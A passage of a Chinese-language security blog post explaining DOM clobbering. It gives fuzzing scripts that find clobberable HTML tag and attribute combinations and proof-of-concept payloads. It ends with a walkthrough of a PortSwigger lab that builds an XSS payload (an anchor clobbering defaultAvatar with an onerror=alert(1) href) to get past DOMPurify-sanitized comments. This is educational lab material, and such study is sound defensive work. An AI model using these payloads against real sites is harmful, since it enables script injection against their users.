class="hljs-string">&quot;footer&quot;</span>,<span class="hljs-string">&quot;form&quot;</span>,<span class="hljs-string">&quot;frame&quot;</span>,<span class="hljs-string">&quot;frameset&quot;</span>,<span class="hljs-string">&quot;h1&quot;</span>,<span class="hljs-string">&quot;head&quot;</span>,<span class="hljs-string">&quot;header&quot;</span>,<span class="hljs-string">&quot;hgroup&quot;</span>,<span class="hljs-string">&quot;hr&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;iframe&quot;</span>,<span class="hljs-string">&quot;image&quot;</span>,<span class="hljs-string">&quot;img&quot;</span>,<span class="hljs-string">&quot;input&quot;</span>,<span class="hljs-string">&quot;ins&quot;</span>,<span class="hljs-string">&quot;isindex&quot;</span>,<span class="hljs-string">&quot;kbd&quot;</span>,<span class="hljs-string">&quot;keygen&quot;</span>,<span class="hljs-string">&quot;label&quot;</span>,<span class="hljs-string">&quot;legend&quot;</span>,<span class="hljs-string">&quot;li&quot;</span>,<span class="hljs-string">&quot;link&quot;</span>,<span class="hljs-string">&quot;listing&quot;</span>,<span class="hljs-string">&quot;main&quot;</span>,<span class="hljs-string">&quot;map&quot;</span>,<span class="hljs-string">&quot;mark&quot;</span>,<span class="hljs-string">&quot;marquee&quot;</span>,<span class="hljs-string">&quot;menu&quot;</span>,<span class="hljs-string">&quot;menuitem&quot;</span>,<span class="hljs-string">&quot;meta&quot;</span>,<span class="hljs-string">&quot;meter&quot;</span>,<span class="hljs-string">&quot;multicol&quot;</span>,<span class="hljs-string">&quot;nav&quot;</span>,<span class="hljs-string">&quot;nextid&quot;</span>,<span class="hljs-string">&quot;nobr&quot;</span>,<span class="hljs-string">&quot;noembed&quot;</span>,<span class="hljs-string">&quot;noframes&quot;</span>,<span class="hljs-string">&quot;noscript&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-string">&quot;ol&quot;</span>,<span class="hljs-string">&quot;optgroup&quot;</span>,<span class="hljs-string">&quot;option&quot;</span>,<span class="hljs-string">&quot;output&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;param&quot;</span>,<span class="hljs-string">&quot;picture&quot;</span>,<span class="hljs-string">&quot;plaintext&quot;</span>,<span class="hljs-string">&quot;pre&quot;</span>,<span class="hljs-string">&quot;progress&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>,<span class="hljs-string">&quot;rp&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-string">&quot;rtc&quot;</span>,<span class="hljs-string">&quot;ruby&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;samp&quot;</span>,<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;section&quot;</span>,<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;shadow&quot;</span>,<span class="hljs-string">&quot;slot&quot;</span>,<span class="hljs-string">&quot;small&quot;</span>,<span class="hljs-string">&quot;source&quot;</span>,<span class="hljs-string">&quot;spacer&quot;</span>,<span class="hljs-string">&quot;span&quot;</span>,<span class="hljs-string">&quot;strike&quot;</span>,<span class="hljs-string">&quot;strong&quot;</span>,<span class="hljs-string">&quot;style&quot;</span>,<span class="hljs-string">&quot;sub&quot;</span>,<span class="hljs-string">&quot;summary&quot;</span>,<span class="hljs-string">&quot;sup&quot;</span>,<span class="hljs-string">&quot;svg&quot;</span>,<span class="hljs-string">&quot;table&quot;</span>,<span class="hljs-string">&quot;tbody&quot;</span>,<span class="hljs-string">&quot;td&quot;</span>,<span class="hljs-string">&quot;template&quot;</span>,<span class="hljs-string">&quot;textarea&quot;</span>,<span class="hljs-string">&quot;tfoot&quot;</span>,<span class="hljs-string">&quot;th&quot;</span>,<span class="hljs-string">&quot;thead&quot;</span>,<span class="hljs-string">&quot;time&quot;</span>,<span class="hljs-string">&quot;title&quot;</span>,<span class="hljs-string">&quot;tr&quot;</span>,<span class="hljs-string">&quot;track&quot;</span>,<span class="hljs-string">&quot;tt&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;ul&quot;</span>,<span class="hljs-string">&quot;var&quot;</span>,<span class="hljs-string">&quot;video&quot;</span>,<span class="hljs-string">&quot;wbr&quot;</span>,<span class="hljs-string">&quot;xmp&quot;</span>], logs = [];</span><br><span class="line">div=<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;div&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;html.length;i++) {</span><br><span class="line">  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;html.length;j++) {</span><br><span class="line">    div.innerHTML=<span class="hljs-string">&apos;&lt;&apos;</span>+html[i]+<span class="hljs-string">&apos; id=element1&gt;&apos;</span>+<span class="hljs-string">&apos;&lt;&apos;</span>+html[j]+<span class="hljs-string">&apos; id=element2&gt;&apos;</span>;</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">window</span>.element1 &amp;&amp; element1.element2){</span><br><span class="line">       log.push(html[i]+<span class="hljs-string">&apos;,&apos;</span>+html[j]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log.join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x4EE3;&#x7801;&#x6D4B;&#x8BD5;&#x4E86;&#x73B0;&#x5728; HTML5 &#x57FA;&#x672C;&#x4E0A;&#x6240;&#x6709;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x4F7F;&#x7528;&#x4E24;&#x5C42;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x8FDB;&#x884C; fuzz &#xFF0C;&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x53EA;&#x4F7F;&#x7528;&#x4E86;<code>id</code>&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x4F7F;&#x7528;<code>name</code>&#xFF0C;&#x9047;&#x4E0A;&#x6587;&#x7684;<code>HTMLCollection</code>&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7684;&#x662F;&#x4EE5;&#x4E0B;&#x5173;&#x7CFB;&#xFF1A;</p><p></p><figure class="highlight xl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>button</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>fieldset</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>image</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>img</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>input</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>object</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>output</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>select</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>textarea</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x6784;&#x5EFA;<code>x.y</code>&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x6784;&#x5EFA;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span>&gt;</span>I&apos;ve been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(x.y.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Three-Level"><a href="#Three-Level" class="headerlink" title="Three Level"></a>Three Level</h3><p>&#x4E09;&#x7EA7;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;&#x4EE5;&#x4E0A;&#x4E24;&#x79CD;&#x6280;&#x5DE7;&#x6765;&#x6784;&#x5EFA;&#x4E86;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;y&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">z</span>&gt;</span>I&apos;ve been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y.z.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5148;&#x7528;&#x4E00;&#x4E2A;<code>HTMLCollection</code>&#x83B7;&#x53D6;&#x7B2C;&#x4E8C;&#x7EA7;&#xFF0C;&#x518D;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x8868;&#x5355;&#x4E2D;&#x7528;<code>output</code>&#x6807;&#x7B7E;&#x5373;&#x53EF;&#x3002;</p><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>&#x4E09;&#x5C42;&#x5C42;&#x7EA7;&#x4EE5;&#x4E0A;&#x7684;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;<code>iframe</code>&#x4E0E;<code>srcdoc</code>&#x6765;&#x8FDB;&#x884C;&#x914D;&#x5408;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc=&apos;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&apos; name=b&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript">setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>alert(a.b.c.d),<span class="hljs-number">500</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x7B49;&#x5F85;&#x6240;&#x6709;&#x7684;<code>iframe</code>&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x6211;&#x4EEC;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x8FD9;&#x4E2A;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x7528;&#x5230;&#x5EF6;&#x65F6;&#xFF0C;&#x4E0D;&#x7528;&#x5EF6;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x6765;&#x8FDB;&#x884C;&#x5EF6;&#x7F13;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc=&apos;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&apos; name=b&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> <span class="hljs-string">&apos;http://example.com&apos;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(a.b.c.d)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Custom"><a href="#Custom" class="headerlink" title="Custom"></a>Custom</h3><p>&#x4EE5;&#x4E0A;&#x6211;&#x4EEC;&#x90FD;&#x662F;&#x901A;&#x8FC7; id &#x6216;&#x8005; name &#x6765;&#x5229;&#x7528;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x80FD;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x5C5E;&#x6027;&#x6765;&#x6784;&#x9020;&#x5462;&#xFF1F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">y</span>=<span class="hljs-string">123</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.y)<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4EFB;&#x4F55;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#x5C5E;&#x6027;&#x90FD;&#x4E0D;&#x4F1A;&#x5177;&#x6709; DOM &#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x8FD4;&#x56DE;&#x4E86; <code>undefined</code></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B; fuzz &#x6240;&#x6709;&#x6807;&#x7B7E;&#x7684;&#x6709;&#x6CA1;&#x6709;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x5C5E;&#x6027;&#x53EF;&#x4F9B;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">   <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&apos;string&apos;</span>) {</span><br><span class="line">      <span class="hljs-keyword">try</span> {</span><br><span class="line">        props.push(html[i]+<span class="hljs-string">&apos;:&apos;</span>+prop);</span><br><span class="line">      }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">    }</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x7CFB;&#x5217;&#x6807;&#x7B7E;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F8B;&#x5982;:</p><p></p><figure class="highlight avrasm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">a:</span>username</span><br><span class="line"><span class="hljs-symbol">a:</span>password</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x8FD9;&#x4EC5;&#x4EC5;&#x5F97;&#x5230;&#x7684;&#x53EA;&#x662F;&#x77E5;&#x9053;&#x5B83;&#x4EEC;&#x5C5E;&#x6027;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;&#x80FD;&#x4E0D;&#x80FD;&#x5229;&#x7528;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#x6765;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">  <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&apos;string&apos;</span>) {</span><br><span class="line">   <span class="hljs-keyword">try</span> {</span><br><span class="line">    DOM.innerHTML = <span class="hljs-string">&apos;&lt;&apos;</span>+html[i]+<span class="hljs-string">&apos; id=x &apos;</span>+prop+<span class="hljs-string">&apos;=1&gt;&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>)[prop] == <span class="hljs-number">1</span>) {</span><br><span class="line">       props.push(html[i]+<span class="hljs-string">&apos;:&apos;</span>+prop);</span><br><span class="line">    }</span><br><span class="line">    }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">  }</span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x6807;&#x7B7E;&#x4EE5;&#x53CA;&#x5176;&#x5C5E;&#x6027;&#x540D;&#x79F0;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5176;&#x4E2D;&#x7684;<code>a:title</code>&#x6765;&#x8FDB;&#x884C;&#x7EC4;&#x5408;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&apos;hasaki&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(x.title);<span class="hljs-comment">//hasaki</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;&#x5728;&#x6211;&#x4EEC;&#x7B2C;&#x4E00;&#x6B65;&#x5F97;&#x5230;&#x7684;&#x5C5E;&#x6027;&#x4E2D;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x662F; a &#x6807;&#x7B7E;&#x7684;<code>username</code>&#x8DDF;<code>password</code>&#x5C5E;&#x6027;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x901A;&#x8FC7;<code>title</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x5229;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>href</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5229;&#x7528;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;ftp:Clobbered-username:Clobbered-Password@a&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.username)<span class="hljs-comment">//Clobbered-username</span></span></span><br><span class="line"><span class="hljs-actionscript">alert(x.password)<span class="hljs-comment">//Clobbered-password</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Exploit-Example"><a href="#Exploit-Example" class="headerlink" title="Exploit Example"></a>Exploit Example</h2><p>PostWigger &#x63D0;&#x4F9B;&#x4E86;&#x4E24;&#x4E2A;&#x5B9E;&#x9A8C;&#x73AF;&#x5883; <a href="https://portswigger.net/web-security/dom-based/dom-clobbering&#xFF0C;" target="_blank" rel="noopener">https://portswigger.net/web-security/dom-based/dom-clobbering&#xFF0C;</a></p><h3 id="Lab-Exploiting-DOM-clobbering-to-enable-XSS"><a href="#Lab-Exploiting-DOM-clobbering-to-enable-XSS" class="headerlink" title="Lab: Exploiting DOM clobbering to enable XSS"></a>Lab: Exploiting DOM clobbering to enable XSS</h3><blockquote><p>&#x200B;    This lab contains a DOM-clobbering vulnerability. The comment functionality allows &#x201C;safe&#x201D; HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">XSS</a> to call the alert() function.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x5B9E;&#x9A8C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<code>resources/js/loadCommentsWithDomPurify.js</code>&#x8DEF;&#x7531;&#x627E;&#x5230;&#x8FD9;&#x4E2A; JS &#x6587;&#x4EF6;&#xFF0C;&#x5728;<code>displayComments()</code>&#x51FD;&#x6570;&#x4E2D;&#x6211;&#x4EEC;&#x53C8;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> defaultAvatar = <span class="hljs-built_in">window</span>.defaultAvatar || {<span class="hljs-attr">avatar</span>: <span class="hljs-string">&apos;/resources/images/avatarDefault.svg&apos;</span>}</span><br><span class="line"><span class="hljs-keyword">let</span> avatarImgHTML = <span class="hljs-string">&apos;&lt;img class=&quot;avatar&quot; src=&quot;&apos;</span> + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + <span class="hljs-string">&apos;&quot;&gt;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> divImgContainer = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line">divImgContainer.innerHTML = avatarImgHTML</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x5F88;&#x660E;&#x663E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; Dom Clobbering &#x6765;&#x63A7;&#x5236; <code>window.defaultAvatar</code>&#xFF0C;&#x53EA;&#x8981;&#x6211;&#x4EEC;&#x539F;&#x6765;&#x6CA1;&#x6709;&#x5934;&#x50CF;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x4E2A;&#x6784;&#x9020;&#x4E00;&#x4E2A;<code>defaultAvatar.avatar</code>&#x8FDB;&#x884C; XSS &#x4E86;&#x3002;</p><p>&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E24;&#x5C42;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; HTMLCollection &#x6765;&#x64CD;&#x4F5C;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span> <span class="hljs-attr">name</span>=<span class="hljs-string">avatar</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x6CE8;&#x610F;<code>&quot;</code>&#x9700;&#x8981;&#x8FDB;&#x884C; HTML&#x5B9E;&#x4F53;&#x7F16;&#x7801;&#xFF0C;&#x7528; URL &#x7F16;&#x7801;&#x7684;&#x8BDD;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x62A5;&#x9519;<code>1:%22onerror=alert(1)// 